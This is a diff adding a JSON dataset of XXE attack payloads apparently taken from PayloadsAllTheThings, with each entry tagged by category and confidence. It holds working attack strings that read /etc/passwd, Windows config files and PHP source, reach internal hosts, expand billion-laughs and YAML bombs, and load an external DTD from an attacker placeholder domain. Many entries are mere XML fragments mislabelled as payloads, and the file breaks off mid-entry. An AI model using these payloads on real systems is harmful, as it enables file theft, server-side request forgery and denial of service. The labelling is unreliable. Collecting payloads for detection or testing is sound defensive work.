@@ -1,0 +1,2502 @@
+[
+  {
+    "payload": "<!--?xml version=\"1.0\" ?-->",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!DOCTYPE replace [<!ENTITY example \"Doe\"> ]>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<userInfo>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<firstName>John</firstName>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<lastName>&example;</lastName>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "</userInfo>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<?xml version=\"1.0\"?>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!DOCTYPE data [",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ELEMENT data (#ANY)>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ENTITY file SYSTEM \"file:///etc/passwd\">",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "]>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<data>&file;</data>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!DOCTYPE foo [",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ELEMENT foo ANY >",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!DOCTYPE foo [",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ELEMENT foo ANY >",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ENTITY xxe SYSTEM \"file:///c:/boot.ini\" >]><foo>&xxe;</foo>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ENTITY % xxe PUBLIC \"Random Text\" \"URL\">",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ENTITY xxe PUBLIC \"Any TEXT\" \"URL\">",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!DOCTYPE test [ <!ENTITY % init SYSTEM \"data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk\"> %init; ]><foo/>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!DOCTYPE replace [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\"> ]>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<contacts>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<contact>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<name>Jean &xxe; Dupont</name>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<phone>00 11 22 33 44</phone>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<address>42 rue du CTF</address>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<zipcode>75000</zipcode>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<city>Paris</city>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "</contact>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "</contacts>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!DOCTYPE foo [",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ELEMENT foo ANY >",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ENTITY % xxe SYSTEM \"php://filter/convert.base64-encode/resource=http://10.0.0.3\" >",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "]>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<foo>&xxe;</foo>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\">",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!DOCTYPE foo [",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ELEMENT foo ANY >",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ENTITY xxe SYSTEM \"http://internal.service/secret_pass.txt\" >",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "]>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<foo>&xxe;</foo>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!DOCTYPE data [",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ENTITY a0 \"dos\" >",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ENTITY a1 \"&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;\">",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ENTITY a2 \"&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;\">",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ENTITY a3 \"&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;\">",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ENTITY a4 \"&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;\">",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "]>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<data>&a4;</data>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "a: &a [\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\"]",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!DOCTYPE r [",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ENTITY % pe_1 \"<!---->\">",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ENTITY % pe_2 \"&#37;pe_1;<!---->&#37;pe_1;\">",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ENTITY % pe_3 \"&#37;pe_2;<!---->&#37;pe_2;\">",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ENTITY % pe_4 \"&#37;pe_3;<!---->&#37;pe_3;\">",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "%pe_4;",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "]>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<r/>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!DOCTYPE root [",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ENTITY % local_dtd SYSTEM \"file:///abcxyz/\">",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "%local_dtd;",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "]>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<root></root>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "/usr/share/xml/fontconfig/fonts.dtd",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "/usr/share/xml/svg/svg10.dtd",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "/usr/share/xml/svg/svg11.dtd",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "/usr/share/yelp/dtd/docbookx.dtd",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!DOCTYPE message [",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ENTITY % local_dtd SYSTEM \"file:///usr/share/xml/fontconfig/fonts.dtd\">",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ENTITY % constant 'aaa)>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ENTITY &#x25; file SYSTEM \"file:///etc/passwd\">",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///patt/&#x25;file;&#x27;>\">",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "&#x25;eval;",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "&#x25;error;",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ELEMENT aa (bb'>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "%local_dtd;",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "]>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<message>Text</message>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!DOCTYPE doc [",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ENTITY % local_dtd SYSTEM \"file:///C:\\Windows\\System32\\wbem\\xml\\cim20.dtd\">",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ENTITY % SuperClass '>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ENTITY &#x25; file SYSTEM \"file://D:\\webserv2\\services\\web.config\">",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://t/#&#x25;file;&#x27;>\">",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "&#x25;eval;",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "&#x25;error;",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ENTITY test \"test\"'",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": ">",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "%local_dtd;",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "]><xxx>anything</xxx>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!DOCTYPE doc [",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ENTITY % local_dtd SYSTEM \"file:///C:\\Windows\\System32\\wbem\\xml\\cim20.dtd\">",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ENTITY % SuperClass '>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ENTITY &#x25; file SYSTEM \"https://erp.company.com\">",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://test/#&#x25;file;&#x27;>\">",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "&#x25;eval;",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "&#x25;error;",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ENTITY test \"test\"'",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": ">",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "%local_dtd;",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "]><xxx>anything</xxx>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<?xml version=\"1.0\" ?>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!DOCTYPE message [",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ENTITY % ext SYSTEM \"http://[ATTACKER.DOMAIN.TLD]/ext.dtd\">",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "%ext;",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "]>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<message></message>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ENTITY % file SYSTEM \"file:///etc/passwd\">",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>\">",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "%eval;",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
